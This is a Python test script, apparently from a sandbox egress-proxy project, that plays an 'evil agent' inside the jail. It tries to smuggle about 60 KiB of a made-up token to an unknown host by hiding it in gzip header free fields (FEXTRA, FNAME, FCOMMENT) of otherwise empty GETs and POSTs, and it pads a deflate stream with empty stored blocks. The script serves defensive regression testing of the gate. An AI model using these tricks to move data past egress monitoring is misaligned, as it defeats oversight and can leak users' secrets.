"""Evil agent: hide bytes where the gzip decoding never looks (code review of 2026-10-29, G1).

Runs INSIDE the jail, as the agent's user (python3 -c). One JSON object on the last line.

A gzip header (RFC 1952, 2.3.1) has three free fields: FEXTRA, FNAME and FCOMMENT. zlib skips
them, so a body whose deflate stream is empty decodes to nothing while ~60 KiB ride in its
header. The gate used to decide "has a body" from the decoded bytes: a GET with such a body to
an unknown host passed as a plain read and the hidden bytes left. Modes:

- ``hide <host> <tag> <hidden>``: the hidden token (made up by the test, one the redaction does
  not recognise), repeated to ~60 KiB, in FCOMMENT, FNAME and FEXTRA of GETs whose deflate stream
  is empty; a GET whose gzip holds nothing at all; and a POST with a real small JSON body plus a
  loaded FCOMMENT. Each must be refused (400), never reach the server.
- ``write <host> <tag> <mtime> <timeout>``: an honest gzip POST of a fixed JSON body, no free
  fields. Only ``mtime`` (a header field) changes its raw bytes: the same JSON compressed in
  another moment is another request, not the retry of an approved one.
- ``padded <host> <tag> <timeout>``: a POST whose gzip decodes to ``b"ok"`` but whose deflate
  stream is ~1 MiB of empty stored blocks (BTYPE=00, LEN=0) before a final block with the two
  bytes. The header has no free fields and it decodes to something, so it is held, not refused;
  the gate forwards what it read, so only 2 bytes reach the server, never the MiB.
"""

import http.client
import json
import ssl
import struct
import sys
import zlib

PROXY = ("backtide-proxy", 8080)
CA = "/etc/backtide-ca/ca.pem"
HIDDEN_SIZE = 60 * 1024  # fits FEXTRA's 16-bit XLEN; FNAME/FCOMMENT have no length cap
GIVE_UP = 10  # a refusal comes back at once; a held write waits this long and gives up
BODY = b'{"note": "an honest little write", "ok": true}'  # the control write's real body
PADDED_FILLER = 1024 * 1024  # ~1 MiB of empty deflate blocks around a 2-byte body
# The three gzip free fields (RFC 1952, 2.3.1): the FLG bit, and whether the field is
# length-prefixed (FEXTRA) or zero-terminated (FNAME, FCOMMENT).
FREE_FIELDS = {"fcomment": 0x10, "fname": 0x08, "fextra": 0x04}


def member(
    data: bytes, *, flag: int = 0, hidden: bytes = b"", mtime: int = 0, deflate: bytes | None = None
) -> bytes:
    """A gzip member (RFC 1952) whose deflate stream decodes to ``data``, with ``hidden`` bytes
    tucked into the free field named by ``flag`` (none when 0). ``mtime`` is a header field: it
    changes the raw bytes without touching what decodes out. ``deflate``: a deflate stream built
    by hand, in place of zlib's."""
    header = bytearray(b"\x1f\x8b\x08")  # magic, CM = deflate
    header.append(flag)  # FLG: which free fields follow
    header += struct.pack("<IBB", mtime & 0xFFFFFFFF, 0, 3)  # MTIME, XFL, OS (unix)
    if flag == 0x04:  # FEXTRA: 16-bit length, then the bytes
        header += struct.pack("<H", len(hidden)) + hidden
    elif flag in (0x08, 0x10):  # FNAME / FCOMMENT: zero-terminated (no NUL inside)
        header += hidden + b"\x00"
    if deflate is None:
        stream = zlib.compressobj(9, zlib.DEFLATED, -15)  # raw deflate, as a gzip body is
        deflate = stream.compress(data) + stream.flush()
    trailer = struct.pack("<II", zlib.crc32(data) & 0xFFFFFFFF, len(data) & 0xFFFFFFFF)
    return bytes(header) + deflate + trailer


def stored_padding(data: bytes, filler: int) -> bytes:
    """A raw deflate stream (RFC 1951) that decodes to ``data``: ``filler`` bytes of empty stored
    blocks (BFINAL=0, BTYPE=00, LEN=0, NLEN=0xFFFF, five bytes each, decoding to nothing) before a
    final stored block that holds ``data``. Room that goes nowhere once the gate reads it."""
    empty = bytes([0x00, 0x00, 0x00, 0xFF, 0xFF])  # one empty non-final stored block
    final = bytearray([0x01])  # BFINAL=1, BTYPE=00
    final += struct.pack("<HH", len(data), len(data) ^ 0xFFFF)  # LEN, NLEN (one's complement)
    final += data
    return empty * (filler // len(empty)) + bytes(final)


def send(host: str, method: str, path: str, raw: bytes, timeout: float = GIVE_UP) -> object:
    """A request through the proxy with a gzip-encoded body; the status, or the error's name."""
    conn = http.client.HTTPSConnection(
        *PROXY, timeout=timeout, context=ssl.create_default_context(cafile=CA)
    )
    conn.set_tunnel(host, 443)
    try:
        conn.request(method, path, body=raw, headers={"Content-Encoding": "gzip"})
        return conn.getresponse().status
    except (OSError, http.client.HTTPException) as error:
        return type(error).__name__  # a timeout: a held write that gave up waiting
    finally:
        conn.close()


def hide(host: str, tag: str, hidden: str) -> dict:
    """Try to smuggle ``hidden`` (~60 KiB) out past the gate in a gzip header."""
    seed = hidden.encode()
    loot = (seed * (HIDDEN_SIZE // len(seed) + 1))[:HIDDEN_SIZE]
    out: dict[str, object] = {}
    # 1-2: a GET whose deflate stream is empty, the payload riding in each free field.
    for name, flag in FREE_FIELDS.items():
        raw = member(b"", flag=flag, hidden=loot)
        out[name] = send(host, "GET", f"/{tag}/{name}", raw)
    # Extra: a GET whose gzip holds nothing at all (no free fields, empty deflate).
    out["empty"] = send(host, "GET", f"/{tag}/empty", member(b""))
    # 3: a POST with a real small body plus a loaded FCOMMENT.
    out["post"] = send(host, "POST", f"/{tag}/post", member(BODY, flag=0x10, hidden=loot))
    return {"hidden_bytes": len(loot), **out}


def write(host: str, tag: str, mtime: int, timeout: float) -> dict:
    """The control: an honest gzip POST of BODY, no free fields. Only ``mtime`` varies."""
    raw = member(BODY, mtime=mtime)
    status = send(host, "POST", f"/{tag}/write", raw, timeout)
    return {"mtime": mtime, "raw_size": len(raw), "decoded_size": len(BODY), "status": status}


def padded(host: str, tag: str, timeout: float) -> dict:
    """A ~1 MiB gzip that decodes to the two bytes ``ok``: the deflate stream's own free room."""
    raw = member(b"ok", deflate=stored_padding(b"ok", PADDED_FILLER))
    status = send(host, "POST", f"/{tag}/padded", raw, timeout)
    return {"raw_size": len(raw), "decoded_size": 2, "status": status}


mode = sys.argv[1]
if mode == "hide":
    print(json.dumps(hide(sys.argv[2], sys.argv[3], sys.argv[4])))
elif mode == "padded":
    print(json.dumps(padded(sys.argv[2], sys.argv[3], float(sys.argv[4]))))
else:  # write <host> <tag> <mtime> <timeout>
    print(json.dumps(write(sys.argv[2], sys.argv[3], int(sys.argv[4]), float(sys.argv[5]))))
